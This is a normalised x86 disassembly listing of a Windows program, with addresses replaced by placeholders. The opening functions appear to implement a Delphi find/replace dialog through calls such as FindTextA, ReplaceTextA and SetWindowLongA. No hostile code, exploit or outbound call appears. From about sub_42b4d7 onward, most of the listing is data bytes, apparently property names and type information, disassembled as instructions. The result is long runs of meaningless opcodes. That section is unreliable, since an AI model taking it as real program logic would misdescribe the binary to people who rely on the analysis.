push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42ae24
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42af60
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4297f8
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42aed8
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b00a
add [ eax ] al
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d6a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_429840
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42b060
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43f3dc
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42b09c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42aed8
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444ab0
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42b060
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_448d84
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42b1b0
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42b218
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_429874
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403540
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403540
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_448d84
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42b310
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404554
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408a1c
pop esi
pop ebx
retn
sub_42b334
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404554
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408a1c
pop esi
pop ebx
retn
sub_42b358
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42af60
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b43c
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_409014
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42b4d7
add [ edi ] cl
add [ eax ] al
add [ eax ] dh
sub [ ecx ] cl
test [ eax ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + ebp ] ch
dec ecx
add [ eax ] bl
xor ecx [ ecx ]
add [ eax ] al
add [ eax ] al
sub [ eax ] ch
dec ecx
add [ eax + 0x30 ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + ebp ] ah
dec ecx
add [ esp + esi + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub [ ecx ] cl
xor [ ebx ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + ebp ] bl
dec ecx
add ah cl
xor cl [ ecx ]
add [ eax ] al
add [ eax ] al
sbb [ eax ] ch
dec ecx
add ah bl
xor ecx [ ecx ]
add [ eax ] al
add [ eax ] al
adc al 0x28
dec ecx
add al dh
xor [ ecx ] ecx
add [ eax ] al
add [ eax ] al
adc [ eax ] ch
dec ecx
add ah ah
xor cl [ ecx ]
add [ eax ] al
add [ eax ] al
or al 0x28
dec ecx
add [ eax ] bl
xor cl [ ecx ]
add [ eax ] al
add [ eax ] al
or [ eax ] ch
dec ecx
add al ah
xor al 0x49
add [ eax ] al
add [ eax ] al
add ah dl
daa
dec ecx
add al ah
xor [ ecx ] cl
add [ eax ] al
add [ eax ] al
shl [ edi ] 0x1
dec ecx
add [ eax + 0x34 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add ah cl
daa
dec ecx
add [ eax + 0x4934 ] cl
add [ eax ] al
add al cl
daa
dec ecx
add [ eax + 0x32 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b5e2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5e9
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404b1c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42b5ec
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e68
call sub_42b43c
mov eax [ r-xdata ]
call sub_413ba8
mov eax [ r-xdata ]
call sub_413c48
mov edx [ r-xdata ]
mov eax [ sub_4285ac ]
call sub_413bf4
sub_42b70e
cmp cl ah
inc edx
add al bl
jecxz r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sub al 0xd6
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi ] al
push esp
dec ecx
insd
popad
lea eax [ bx + si ]
and al 0xb7
inc edx
add [ edi ] al
push es
push esp
dec ecx
insd
popad
js r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ edi ] ah
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax - 0x80 ]
loop r-xdata
inc edx
add al cl
0x2a0043 0x4508
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
jns r-xdata
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edx ] al
add bh dl
inc edi
or eax 0x75410800
je r-xdata
aad 0x43
inc [ esp + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ esi ] al
inc ebx
outsb
je r-xdata
add bh bh
inc esp
in al 0x42
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add [ eax + eax ] dl
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] cl
inc ecx
jne r-xdata
salc
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
insb
inc esp
imul esi [ ebx + 0x70 ] 0x79616c
adc [ eax ] al
0xc4ff0000 0x4426
add [ ecx ] al
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
outsd
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
jpo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] bl
add [ eax + edx * 2 ] cl
outsb
je r-xdata
add [ eax ] al
add [ edx ] dl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x43ceec73
add [ edx ] bh
add bh bh
jpe r-xdata
inc [ esp + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
add bh bh
test ah ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x1 ] bh
outsb
jne r-xdata
popad
jb r-xdata
jo r-xdata
jb r-xdata
add bh bh
pushfd
in al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jne r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
je r-xdata
adc [ eax ] al
jge r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
jb r-xdata
add [ eax ] eax
[ esp + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070016 ] al
imul esp [ ebx + 0x74 ] 0x7c657275
sbb eax [ ebp ]
jl r-xdata
rol [ ecx ] 0x68
jae r-xdata
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or [ edi + 0x6e ] ecx
sub al 0x1a
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
js r-xdata
pop es
dec edi
push r-xdata
sbb [ eax ] al
or al 0x50
[ esp + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ eax + 0x24 ]
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001d ] al
imul ebp [ edi + 0x6e ] 0x10006c61
inc eax
add [ ecx - 0x5f010000 ] bl
inc esp
add [ eax + 0x26 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
push 0x6948776f
outsb
je r-xdata
add bh bh
or [ 0x10044 ] ah
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax + 0x4f090026 ] al
outsb
dec ebp
outsd
jne r-xdata
nop
add [ eax + 0x4f0b0024 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
and al 0xda
inc ebx
add [ eax ] cl
push eax
outsd
jo r-xdata
adc [ eax ] al
js r-xdata
adc cl [ ecx + 0x6e ]
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ bx + si ]
mov ah 0xbb
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push ebp
jo r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090022 ] al
outsb
jo r-xdata
[ esp + 0x42 ]
add bh bh
insb
in al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push ebx
je r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
in al 0xdb
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0028 ] al
outsb
mov ebp 0x1700041
add bh bh
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
push ebx
je r-xdata
fild [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or al bl
inc ebx
add al bl
add [ eax ] al
fiadd [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
call 0x241ba47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0020 ] al
outsb
sbb al [ ecx ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ba43
add [ eax ] al
inc [ ecx ]
inc eax
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xbd
inc edx
add [ ecx + eax ] ch
add ah dl
jmp 0xffffffffa562bcc9
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x90042bb ] dh
inc ebp
js r-xdata
jb r-xdata
outsb
push eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
mov ebx 0x62090042
jae r-xdata
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
inc esp
jb r-xdata
xor al [ eax ]
sub [ eax + 0x46900044 ] ah
inc esp
add [ eax - 0x4bffbbc6 ] cl
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
mov esp 0x42
inc ebx
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
inc esp
outsd
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
dec esp
outsd
ja r-xdata
bound esi [ ebx + 0x4c ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov al 0xbb
inc edx
add [ ecx ] cl
jae r-xdata
xlat
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
aam 0xd6
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
insb
nop
inc eax
mov ebp 0x6070042
push esp
inc edx
jbe r-xdata
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
jo r-xdata
imul ebp [ esi + 0x65 ] 0x5273620b
xor al [ eax ]
clc
add ah bl
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x43 ] al
inc edx
insb
jae r-xdata
inc ebp
js r-xdata
outsd
js r-xdata
inc edx
add [ 0x6f427362 ] al
jb r-xdata
jb r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0021 ] al
outsb
inc esp
jb r-xdata
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc edx
add [ eax + 0x1 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
movsb [ edi ] [ esi ]
mov esp 0xeac80042
inc ebx
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
inc ecx
add [ esi + 0x42 ] al
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0x18 ]
call 0x5448bd78
inc edx
jbe r-xdata
sbb [ edx - 0x5abfffbf ] ah
insb
jae r-xdata
cmp [ eax + eax - 0x24 ] eax
mov al [ 0xffffffffb0004035 ]
je r-xdata
or ecx [ edi + 0x6e ]
add [ eax ] al
sub [ eax ] 0x0
shl al 0xbb
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
inc ebx
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edi * 4 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov esi 0xbef80042
inc edx
add [ eax + eax ] al
add [ esp + ebp ] al
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
sar [ esi + 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx - 0x3b010000 ] bl
inc esp
add [ eax ] al
inc esp
inc ebx
je r-xdata
add [ eax ] al
add ah ch
mov ebx 0x62050042
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ edi * 4 + 0x16c0042 ] dh
add [ eax ] al
aam 0xe9
inc ebx
push esp
outsd
insd
or [ gs : edx + 0x73 ] esp
inc edx
jb r-xdata
add bh bh
mov al 0xe6
inc edx
mov ebx 0x1680042
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
jo r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
les esp [ esi ]
inc esp
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
out 0x42 al
push 0x6948776f
outsb
je r-xdata
jmp [ edx + ebx + 0x44 ]
add [ edi + ecx * 8 ] al
inc ebx
add [ ebx ] bl
add bh bh
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sub al 0xd6
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
mov ebx 0x1690042
add bh bh
int3
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
sub_42c948
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
dec ebp
outsd
jbe r-xdata
mov al [ 0xfffffffffc004035 ]
jb r-xdata
je r-xdata
nop
xlat
inc ebx
add al ah
add [ eax ] al
jmp eax
inc eax
add al bh
xor al [ eax ]
loopne r-xdata
fdiv [ edx ]
inc edx
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 - 0x6c3ffbf ] dh
inc edx
add [ eax ] ah
sbb al [ eax + eax + 0x50 ]
stc
inc edx
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0xa ] dl
inc edx
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x70 ] es
pushfd
inc ebx
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add ah cl
pushfd
inc ebx
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 - 0x6323ffbc ] al
inc ebx
add [ eax + 0x50042fb ] bh
cwde
inc esp
add ah al
pushad
inc esp
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh

jb r-xdata
mov al [ 0xfffffffffc004035 ]
je r-xdata
push 0x32dc0044
js r-xdata
add [ eax + 0x6f ] al
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
inc esp
outsd
arpl [ ebx - 0x24 ] bp
inc eax
add al bh
xor al [ eax ]
loopne r-xdata
fdiv [ edx ]
inc edx
